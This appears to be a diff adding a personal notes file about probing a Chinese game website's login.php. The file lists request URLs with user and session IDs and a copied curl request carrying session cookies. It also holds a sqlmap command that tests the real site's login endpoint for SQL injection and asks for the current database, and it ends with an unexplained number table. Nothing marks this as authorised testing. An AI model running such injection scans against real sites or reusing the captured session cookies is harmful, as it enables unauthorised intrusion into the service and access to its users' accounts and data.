@@ -1,0 +1,29 @@
+http://ms31.haixing8.cn/login.php?d=map.getonepage&u=27176698&s=70434744&v=2734&x=25488&y=9&cp=0
+
+http://ms31.haixing8.cn/login.php?d=map.getonepage&u=27176698&s=70434744&v=2734&x=0&y=0&cp=10221&main=1
+
+http://ms31.haixing8.cn/login.php?d=map.getonepage&u=27176698&s=70434744&v=2734&x=0&y=0&cp=10222&main=1
+
+http://ms31.haixing8.cn/login.php?d=map.getonepage&u=27176698&s=52226069&v=2734&x=0&y=0&cp=10224&main=1
+
+curl 'http://ms31.haixing8.cn/login.php?d=map.getonepage&u=27176698&s=52226069&v=2734&x=0&y=0&cp=10224&main=1' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://ms31.haixing8.cn/login.php?d=map.getonepage&u=27176698&s=52226069&v=2734&x=25488&y=9&cp=0' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,nl;q=0.7' -H 'Cookie: ms_user_name=quantum; uid=27176698; gmsid=b6603cb194618d11f2c1c9a07246e125; spid=trdo' --compressed
+
+
+http://ms31.haixing8.cn/login.php?d=login.enter&u=21367898&s=62012925&v=3059
+
+http://ms31.haixing8.cn/login.php?d=login.enter&u=21367898&s=66352125&v=3059
+
+http://ms31.haixing8.cn/login.php?d=login.enter&u=21367898&s=97930686&v=3059
+
+~~~~~
+
+http://ms31.haixing8.cn/login.php?d=login.enter&u=20022607&s=33943049&v=2924
+
+python sqlmap.py -u "http://ms31.haixing8.cn/login.php?d=login.enter&u=20022607&s=33943049&v=2924" --cookie="spid=trdo; ms_user_name=13800000000; uid=20022607; clienttype=WAP2; gmsid=d2e91253c6df8de6ed6691408786e01f; security=low" --current-db
+1 == 4,4,4,6
+2 == 3,4,5,6
+3 == 5,3,4,6
+4 == 4,5,3,6
+5 == 3,3,3,9
+6 == 1,1,1,15
+7 == 0,0,0,18
